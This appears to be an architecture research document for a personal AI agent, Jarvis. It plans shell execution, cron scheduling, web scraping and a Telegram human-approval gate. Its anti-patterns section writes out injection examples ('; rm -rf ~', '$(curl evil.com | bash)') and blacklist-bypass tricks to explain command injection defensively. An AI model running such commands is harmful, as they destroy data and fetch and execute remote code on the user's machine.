# Architecture Research

**Domain:** Personal AI agent — tool execution, scheduling, security, supervision
**Researched:** 2026-03-18
**Confidence:** HIGH (based on direct codebase inspection + verified patterns)

## Standard Architecture

### System Overview

The existing architecture is a clean layered monolith running in a single Node.js process supervised by a parent process. New capabilities (web search/scraping, code execution, scheduling, human approval) extend this structure without breaking boundaries.

```
┌────────────────────────────────────────────────────────────────┐
│                        SUPERVISOR PROCESS                       │
│  src/supervisor.ts — spawns + monitors the bot process         │
│  Handles: crash recovery, git pull on update, exit code routing │
│  New: heartbeat detection, periodic git polling, crash logs     │
├────────────────────────────────────────────────────────────────┤
│                          BOT PROCESS                            │
├─────────────────────────────────┬──────────────────────────────┤
│           CHANNEL LAYER         │       SCHEDULER LAYER         │
│  src/channels/telegram.ts       │  src/scheduler/               │
│  - inbound messages             │  - cron jobs (node-cron)      │
│  - approval callbacks (new)     │  - task definitions           │
│  - broadcast for proactive msgs │  - runs agent autonomously    │
│         ↓                       │         ↓                     │
├─────────────────────────────────┴──────────────────────────────┤
│                          AGENT LAYER                            │
│  src/agent/agent.ts — LLM ↔ tool loop                          │
│  src/agent/context-builder.ts — system prompt assembly         │
├──────────────────────────────────────────┬─────────────────────┤
│           SECURITY LAYER (new)           │     LLM LAYER        │
│  src/security/                           │  src/llm/            │
│  - command blacklist                     │  - openrouter.ts     │
│  - permission registry per tool          │  - model-router.ts   │
│  - approval gate (pause/resume)          │                      │
├──────────────────────────────────────────┴─────────────────────┤
│                          TOOLS LAYER                            │
│  src/tools/tool-registry.ts — register + execute               │
│  src/tools/built-in/                                            │
│    Existing: memory, time, GWS, Bitbucket, restart             │
│    New: web-search, web-scrape, shell-exec, schedule-task       │
├────────────────────────────────────────────────────────────────┤
│                          MEMORY LAYER                           │
│  src/memory/db.ts — SQLite WAL + FTS5                          │
│  src/memory/memory-manager.ts — memories, sessions             │
│  New table: scheduled_tasks (id, cron, prompt, enabled)        │
│  New table: execution_log (id, tool, args, result, timestamp)  │
└────────────────────────────────────────────────────────────────┘
```

### Component Responsibilities

| Component | Responsibility | Communicates With |
|-----------|----------------|-------------------|
| `supervisor.ts` | Process lifecycle, crash recovery, git updates, hang detection | OS (child_process), bot process via exit codes |
| `channels/telegram.ts` | Inbound messages, outbound replies, approval callbacks, broadcast | Agent layer, Security approval gate |
| `agent/agent.ts` | LLM ↔ tool iteration loop, session history, model routing | LLM layer, Tool registry, Memory manager |
| `security/` (new) | Command blacklist, per-tool permissions, human approval pause/resume | Tool registry (wraps execute), Telegram channel |
| `scheduler/` (new) | Cron job management, fires agent runs on schedule | Agent layer, Memory (scheduled_tasks table), Telegram broadcast |
| `tools/built-in/web-search.ts` (new) | HTTP search API calls, return ranked results | LLM via tool result |
| `tools/built-in/web-scrape.ts` (new) | Fetch + parse HTML via Cheerio, return text content | LLM via tool result |
| `tools/built-in/shell-exec.ts` (new) | Execute commands via child_process.spawn (not shell), filtered by blacklist | Security layer, returns stdout/stderr |
| `tools/built-in/schedule-task.ts` (new) | CRUD on scheduled_tasks table | Memory layer (SQLite) |
| `memory/db.ts` | SQLite schema + migrations, WAL mode | All layers that need persistence |
| `llm/openrouter.ts` | API calls to OpenRouter with tier selection | Agent loop |

## Recommended Project Structure

```
src/
├── index.ts                    # Entry point — wires everything, starts scheduler
├── config.ts                   # Env config + new scheduler/security settings
├── types.ts                    # Shared types
├── exit-codes.ts               # Exit code constants
├── restart-signal.ts           # Pending restart signaling
├── supervisor.ts               # Supervisor process (separate entrypoint)
├── logger.ts                   # Structured logging
│
├── agent/
│   ├── agent.ts                # LLM ↔ tool loop (unchanged interface)
│   └── context-builder.ts      # System prompt assembly
│
├── channels/
│   ├── channel.ts              # Channel interface
│   └── telegram.ts             # Grammy implementation + approval callbacks
│
├── llm/
│   ├── llm-provider.ts         # Interface
│   ├── openrouter.ts           # Implementation
│   └── model-router.ts         # Complexity classification
│
├── memory/
│   ├── db.ts                   # SQLite init + schema migrations
│   │                           # New tables: scheduled_tasks, execution_log
│   ├── memory-manager.ts       # Existing memory API
│   └── soul.ts                 # Personality file loader
│
├── security/                   # NEW module
│   ├── command-blacklist.ts    # Blocked command patterns (array + test fn)
│   ├── tool-permissions.ts     # Per-tool risk level + allowed actions
│   └── approval-gate.ts        # Pause execution, send Telegram prompt, await response
│
├── scheduler/                  # NEW module
│   ├── scheduler.ts            # node-cron scheduler, load tasks from DB
│   ├── task-runner.ts          # Runs runAgent() for scheduled tasks
│   └── task-types.ts           # ScheduledTask interface
│
└── tools/
    ├── tool-types.ts           # Tool interface + ToolContext (add riskLevel)
    ├── tool-registry.ts        # Registry (wrap execute with security check)
    └── built-in/
        ├── get-current-time.ts
        ├── save-memory.ts
        ├── search-memories.ts
        ├── propose-tool.ts
        ├── table-image.ts
        ├── restart-server.ts
        ├── gws-drive.ts
        ├── gws-gmail.ts
        ├── gws-calendar.ts
        ├── gws-sheets.ts
        ├── bitbucket-prs.ts
        ├── web-search.ts       # NEW — search API (Brave/Serper/DuckDuckGo)
        ├── web-scrape.ts       # NEW — Cheerio HTML fetch+parse
        ├── shell-exec.ts       # NEW — spawn child process, blacklist check
        └── schedule-task.ts    # NEW — CRUD for scheduled_tasks table
```

### Structure Rationale

- **security/:** Isolated module so security logic is never scattered across tools. Approval gate lives here, not in individual tools. This makes auditing and changes centralized.
- **scheduler/:** Separate from channels because it is not user-initiated; it initiates agent runs autonomously. Keeps the channel layer's single responsibility intact.
- **tools/built-in/:** All tools stay flat here per existing convention — avoids creating sub-categories that add import complexity.

## Architectural Patterns

### Pattern 1: Security Middleware at Registry Boundary

**What:** `ToolRegistry.execute()` becomes the single enforcement point for all security checks. Before calling `tool.execute()`, the registry checks tool permissions, runs the blacklist if it is a shell tool, and invokes the approval gate for high-risk actions.

**When to use:** Any time a new dangerous capability is added — the tool author does not implement its own security; the registry enforces it uniformly.

**Trade-offs:** Centralizes security logic but requires the registry to know about tool risk levels. Solved by adding a `riskLevel` field to `ToolDefinition`.

**Example:**
```typescript
// tool-types.ts
export interface ToolDefinition {
  name: string;
  description: string;
  parameters: JsonSchema;
  riskLevel?: "low" | "medium" | "high"; // new field
}

// tool-registry.ts — execute wraps with security
async execute(name, args, context): Promise<ToolResult> {
  const tool = this.tools.get(name);
  if (!tool) return { success: false, data: null, error: `Unknown tool: ${name}` };

  // High-risk: require human approval before execution
  if (tool.definition.riskLevel === "high") {
    const approved = await approvalGate.request(context, tool.definition.name, args);
    if (!approved) return { success: false, data: null, error: "User denied execution" };
  }

  try {
    return await tool.execute(args, context);
  } catch (err) {
    return { success: false, data: null, error: `Tool error: ${(err as Error).message}` };
  }
}
```

### Pattern 2: Approval Gate as Async Pause/Resume

**What:** When a high-risk action is requested, the agent loop pauses mid-execution by awaiting a Promise that only resolves when the user responds via Telegram. The approval gate maps a pending request ID to a resolve/reject function stored in memory.

**When to use:** Any tool marked `riskLevel: "high"` — shell execution, file deletion, external sends (email, calendar events).

**Trade-offs:** Simple to implement with a Map of pending promises. Risk: if the bot restarts while an approval is pending, the promise is lost. For personal use this is acceptable — the agent will report failure and the user retries.

**Example:**
```typescript
// security/approval-gate.ts
const pending = new Map<string, (approved: boolean) => void>();

export async function requestApproval(
  notify: (msg: string) => Promise<void>,
  toolName: string,
  args: Record<string, unknown>
): Promise<boolean> {
  const id = randomUUID();
  await notify(`Jarvis quiere ejecutar \`${toolName}\`:\n\`\`\`json\n${JSON.stringify(args, null, 2)}\n\`\`\`\nResponde /approve_${id} o /deny_${id}`);
  return new Promise((resolve) => {
    pending.set(id, resolve);
    setTimeout(() => {
      if (pending.has(id)) {
        pending.delete(id);
        resolve(false); // timeout → auto-deny
      }
    }, 120_000); // 2 min timeout
  });
}

export function handleApprovalResponse(id: string, approved: boolean): void {
  const resolver = pending.get(id);
  if (resolver) {
    pending.delete(id);
    resolver(approved);
  }
}
```

### Pattern 3: Scheduler as Agent Initiator

**What:** The scheduler loads cron tasks from the `scheduled_tasks` SQLite table on startup, schedules them with `node-cron`, and fires `runAgent()` with a synthetic context when they trigger. Results are broadcast via Telegram.

**When to use:** Any time Jarvis needs to take action without user input — morning summaries, PR monitoring, reminders.

**Trade-offs:** Running inside the bot process means scheduled tasks share the same event loop. For a personal agent with low task frequency (a few per day), this is fine and simpler than a separate process. If task volume grows, move to a worker thread.

**Example:**
```typescript
// scheduler/task-runner.ts
export async function runScheduledTask(
  task: ScheduledTask,
  deps: { llm, toolRegistry, memoryManager, soulContent, telegram }
): Promise<void> {
  const sessionId = deps.memoryManager.resolveSession(
    "scheduler", "scheduled", 0  // always new session
  );
  const result = await runAgent(
    {
      userId: "scheduler",
      userName: "Scheduler",
      channelId: "scheduled",
      sessionId,
      userMessage: task.prompt,
    },
    deps.llm, deps.toolRegistry, deps.memoryManager, deps.soulContent, 10
  );
  await deps.telegram.broadcast(result.text);
}
```

### Pattern 4: Shell Execution via spawn (Not exec/execSync)

**What:** Use `child_process.spawn()` with arguments as an array (not a shell string) plus a blacklist check before invocation. Never use `exec()` or `execSync()` with user-supplied strings — shell interpretation enables injection.

**When to use:** Every time the `shell_exec` tool runs a command.

**Trade-offs:** `spawn` without `shell: true` cannot use shell features (pipes, redirects, globs). This is the point — it prevents injection. For legitimate pipeline needs, the tool must explicitly compose operations.

**Example:**
```typescript
// tools/built-in/shell-exec.ts
import { spawn } from "node:child_process";
import { isCommandBlocked } from "../../security/command-blacklist.js";

// args.command is the executable, args.args is string[]
if (isCommandBlocked(args.command as string)) {
  return { success: false, data: null, error: "Command blocked by security policy" };
}

const child = spawn(args.command as string, args.args as string[], {
  shell: false,     // NEVER true
  timeout: 30_000,  // hard cap
  cwd: process.env.HOME, // restrict working directory
});
```

## Data Flow

### User Message Flow (existing + security layer)

```
Telegram message arrives
    ↓
TelegramChannel.handleIncoming()
    ↓ (allowed user check)
runAgent() called
    ↓
buildSystemPrompt() + load session history
    ↓
LLM.chat() → response
    ↓ (if tool_calls present)
ToolRegistry.execute()
    ↓
  [security check: riskLevel?]
    ├── low/medium → tool.execute() immediately
    └── high → approvalGate.request()
              ↓
          Telegram sends approval prompt to user
              ↓
          User responds /approve_<id> or /deny_<id>
              ↓
          Promise resolves
              ↓
          tool.execute() (if approved) or error (if denied)
    ↓
Tool result added to message history
    ↓
Loop back to LLM.chat()
    ↓ (no more tool_calls)
Final text returned to TelegramChannel
    ↓
ctx.reply() to user
```

### Scheduler Flow (new)

```
node-cron fires at cron time
    ↓
scheduler/task-runner.ts
    ↓
Reads task prompt from scheduled_tasks (SQLite)
    ↓
runAgent() with synthetic context (userId="scheduler")
    ↓
Agent loop executes — may use any registered tool
    ↓
telegram.broadcast(result.text)
    ↓
User receives proactive message
```

### Supervisor Enhanced Flow (new)

```
supervisor.ts starts bot process
    ↓
Writes heartbeat timestamp file every N seconds (new)
    ↓
Supervisor polls heartbeat file
    ├── heartbeat current → healthy
    └── heartbeat stale > threshold → SIGKILL + restart (hang detection)
    ↓
Periodic git poll (new) every interval
    ├── no new commits → do nothing
    └── new commits → EXIT_UPDATE → git pull + restart
    ↓
All restarts appended to logs/crashes.jsonl (new)
```

### Key Data Flows

1. **Approval gate interrupt:** Agent loop awaits a Promise stored in `approvalGate.pending` Map. Telegram command handler calls `handleApprovalResponse()` which resolves the Promise. The Map is the only coupling between the two.

2. **Scheduled task to agent:** Scheduler reads from `scheduled_tasks` table → creates synthetic `AgentContext` → passes to same `runAgent()` function used for normal messages. No special agent code path needed.

3. **Shell execution:** `shell-exec` tool receives `{command, args[]}` → blacklist check in `security/command-blacklist.ts` → `spawn()` with `shell: false` → stdout/stderr captured → returned as `ToolResult`.

## Scaling Considerations

This is a single-user personal agent on macOS. Scaling is not a concern. Architecture choices should optimize for simplicity and debuggability, not throughput.

| Concern | At current scale (1 user) | If ever changed |
|---------|---------------------------|-----------------|
| Concurrency | Single message handled at a time; Telegram serializes user messages | Add message queue if parallel users needed |
| Scheduled task load | In-process with node-cron, shares event loop | Move to worker_threads if tasks are CPU-bound |
| SQLite contention | WAL mode handles concurrent reads fine | Switch to Postgres if remote access needed |
| Supervisor | Custom supervisor is sufficient | Replace with PM2 if monitoring UI needed |

## Anti-Patterns

### Anti-Pattern 1: exec() / execSync() with Shell Interpretation

**What people do:** `exec(\`git pull ${userInput}\`)` or `execSync(commandString)` — passes a single string to the shell for interpretation.

**Why it's wrong:** Shell metacharacters in the input (`; rm -rf ~`, `$(curl evil.com | bash)`) execute arbitrary commands. CVE-2025-53372 is a real 2025 example of this exact mistake in an AI agent MCP server.

**Do this instead:** `spawn(executable, argsArray, { shell: false })`. Validate the executable against a whitelist. Pass arguments as separate array elements.

### Anti-Pattern 2: Blacklist-Only Security for Code Execution

**What people do:** Block strings like `rm`, `sudo`, `curl` with regex before passing to shell.

**Why it's wrong:** Blacklists are trivially bypassed via string concatenation, aliasing, or encoding (`r\m`, `base64 decode`, script wrappers). The 2025 n8n sandbox escape (CVE-2025-68613) exploited exactly this class of bypasses.

**Do this instead:** Whitelist approach for command names + `shell: false` spawn + human approval gate for all shell execution. Defense in depth: all three layers must independently stop an attack.

### Anti-Pattern 3: Scheduler as Separate Process

**What people do:** Spawn a separate cron process that calls the bot via HTTP or IPC.

**Why it's wrong:** Adds coordination complexity (IPC), creates a second process to monitor, and requires the agent state (tool registry, memory manager) to be serialized across process boundaries.

**Do this instead:** Run `node-cron` inside the bot process, passing the already-initialized dependencies directly to `runAgent()`. For a personal agent with a handful of daily tasks, the event loop handles this without issue.

### Anti-Pattern 4: Hardcoded Scheduled Tasks

**What people do:** Cron tasks defined as constants in code, requiring a deploy to change schedules.

**Why it's wrong:** Jarvis needs to dynamically create/modify/delete tasks via Telegram and tools. Hardcoded tasks make the agent unable to manage its own schedule.

**Do this instead:** Store tasks in the `scheduled_tasks` SQLite table. The scheduler reads from this table on startup and whenever a task is modified. The `schedule-task` tool becomes the management interface.

### Anti-Pattern 5: Approval Gate Blocking the Event Loop

**What people do:** A synchronous approval check that spins/sleeps waiting for user input.

**Why it's wrong:** Node.js is single-threaded. Blocking the event loop freezes Telegram polling, meaning the user's approval response never arrives.

**Do this instead:** Async/await with a stored Promise resolver. The approval gate stores a `(approved: boolean) => void` callback keyed by request ID. When the Telegram command handler fires, it looks up the ID and calls the callback. The event loop stays free throughout.

## Integration Points

### External Services

| Service | Integration Pattern | Notes |
|---------|---------------------|-------|
| Telegram Bot API | grammy long polling in TelegramChannel | Add command handlers for `/approve_*` and `/deny_*` patterns |
| OpenRouter | HTTP POST via OpenRouterProvider | Model tier routing already implemented |
| Web search API | HTTP GET in web-search tool | Use Brave Search API or Serper for reliability; DuckDuckGo is free but rate-limited |
| Shell commands | child_process.spawn (no shell) | Never exec, never execSync for user-controlled commands |
| Git (auto-update) | execSync("git pull") in supervisor | This is acceptable: fixed command, no user input |

### Internal Boundaries

| Boundary | Communication | Notes |
|----------|---------------|-------|
| Supervisor ↔ Bot | Exit codes (0=clean, 1=crash, 2=restart, 3=update) | Already implemented; add heartbeat file for hang detection |
| Scheduler → Agent | Direct function call `runAgent()` | Pass all deps at startup; scheduler is initialized in `main()` |
| Security Gate ↔ Telegram | Shared `approvalGate` singleton; Telegram calls `handleApprovalResponse()` | The gate module must be initialized with a `notify` callback pointing to `telegram.broadcast` |
| Tool Registry → Security | Registry checks `tool.definition.riskLevel` before execute | All tool risk levels declared at registration time, not runtime |
| Scheduler ↔ Database | Direct SQLite reads via memory-manager or dedicated prepared statements | Add `scheduled_tasks` table in `db.ts` migration |

## Build Order Implications

Dependencies determine which components must be built before others:

1. **Security module first** (`src/security/`) — all new risky tools depend on it. Build command blacklist and approval gate before shell-exec or any high-risk tool.

2. **Web search + web scrape tools** — no new dependencies beyond fetch/Cheerio. These are pure tool additions and can be built immediately without touching security.

3. **Shell execution tool** — depends on security module being in place. Build after security.

4. **Scheduler module + scheduled_tasks DB migration** — depends on `runAgent()` working (already exists) and DB schema. The `schedule-task` tool depends on the DB migration.

5. **Supervisor enhancements** — independent of bot process internals. Can be built at any phase.

Suggested phase ordering:
- Phase 1: Web search + scraping (zero security risk, immediate user value)
- Phase 2: Security module + code/shell execution (security infrastructure first, then the risky tool)
- Phase 3: Scheduled tasks (needs DB migration + scheduler module; scheduler uses all existing tools including web search)
- Phase 4: Supervisor improvements (independent, can be done alongside any other phase)

## Sources

- Direct codebase inspection: `/Users/max/Personal/repos/open-jarvis/src/` (HIGH confidence)
- [CVE-2025-53372: Node.js Sandbox MCP Server command injection](https://github.com/advisories/GHSA-5w57-2ccq-8w95) (HIGH confidence — official GitHub Advisory)
- [CVE-2025-68613: n8n sandbox escape via expression injection](https://www.penligent.ai/hackinglabs/cve-2025-68613-deep-dive-how-node-js-sandbox-escapes-shatter-the-n8n-workflow-engine/) (MEDIUM confidence — security research)
- [Human-in-the-Loop Approval Framework patterns](https://agentic-patterns.com/patterns/human-in-loop-approval-framework/) (MEDIUM confidence — community patterns)
- [Node.js child_process official docs](https://nodejs.org/api/child_process.html) (HIGH confidence — official docs)
- [node-cron vs node-schedule comparison](https://npm-compare.com/cron,node-cron,node-schedule) (MEDIUM confidence — npm comparison)
- [Cheerio vs Playwright for web scraping](https://proxyway.com/guides/cheerio-vs-puppeteer-for-web-scraping) (MEDIUM confidence — community guide)

---
*Architecture research for: Jarvis personal AI agent — new capabilities milestone*
*Researched: 2026-03-18*
